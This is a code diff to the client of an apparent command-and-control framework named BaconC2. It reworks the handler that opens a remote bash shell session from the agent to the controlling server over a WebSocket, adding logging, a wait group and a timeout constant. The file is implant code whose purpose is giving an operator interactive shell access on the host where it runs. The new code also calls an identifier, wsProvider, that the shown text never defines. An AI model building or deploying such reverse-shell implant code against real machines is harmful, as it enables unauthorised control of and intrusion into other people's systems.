@@ -2,11 +2,17 @@ package commands
 
 import (
 	"fmt"
+	"log"
+	"sync"
 	"time"
 
 	"github.com/RabbITCybErSeC/BaconC2/client/core/sysinfo"
 	"github.com/RabbITCybErSeC/BaconC2/client/models"
 	"github.com/RabbITCybErSeC/BaconC2/client/queue"
+)
+
+const (
+	shellSessionTimeout = 30 * time.Second
 )
 
 func RegisterBuiltInCommands(registry *CommandHandlerRegistry, resultsQueue queue.IResultQueue, transport models.ITransportProtocol) {
@@ -58,20 +64,24 @@ func getInfoHandler(cmd models.Command, resultsQueue queue.IResultQueue) models.
 }
 
 func startShellHandler(cmd models.Command, resultsQueue queue.IResultQueue, transport models.ITransportProtocol) models.CommandResult {
-	shellType := "cmd"
-	if cmd.Args != nil {
-		if val, ok := cmd.Args["shell_type"]; ok {
-			shellType = val
+	// Create default configuration
+	config, err := models.NewStreamingConfig(models.ShellTypeBash, "xterm")
+	if err != nil {
+		log.Printf("Failed to create streaming config for command ID %s: %v", cmd.ID, err)
+		return models.CommandResult{
+			ID:     cmd.ID,
+			Status: "error",
+			Output: map[string]string{"error": fmt.Sprintf("Failed to create config: %v", err)},
 		}
 	}
-
-	wsTransport := transport.NewWebSocketTransport(transport.(*transport.HTTPTransport).serverURL, transport.(*transport.HTTPTransport).agentID)
+	wsTransport := wsProvider.NewWebSocketTransport(wsProvider.GetServerURL(), wsProvider.GetAgentID())
 
 	resultChan := make(chan models.CommandResult, 1)
+	var wg sync.WaitGroup
+	wg.Add(1)
+
 	go func() {
-		config := models.StreamingConfig{
-			ShellType: shellType,
-		}
+		defer wg.Done()
 		if err := wsTransport.StartStreamingSession("shell", config, resultChan); err != nil {
 			resultChan <- models.CommandResult{
 				ID:     cmd.ID,
@@ -81,10 +91,13 @@ func startShellHandler(cmd models.Command, resultsQueue queue.IResultQueue, tran
 		}
 	}()
 
+	// Wait for result or timeout
 	select {
 	case result := <-resultChan:
+		wg.Wait() // Ensure goroutine completes
 		if result.Status == "success" {
 			if err := resultsQueue.Add(result); err != nil {
+				log.Printf("Failed to queue shell result for command ID %s: %v", cmd.ID, err)
 				return models.CommandResult{
 					ID:     cmd.ID,
 					Status: "error",
@@ -93,8 +106,10 @@ func startShellHandler(cmd models.Command, resultsQueue queue.IResultQueue, tran
 			}
 		}
 		return result
-	case <-time.After(30 * time.Second):
+	case <-time.After(shellSessionTimeout):
+		log.Printf("Shell session timed out for command ID: %s", cmd.ID)
 		wsTransport.CloseSession("shell")
+		wg.Wait() // Ensure goroutine completes before returning
 		return models.CommandResult{
 			ID:     cmd.ID,
 			Status: "error",
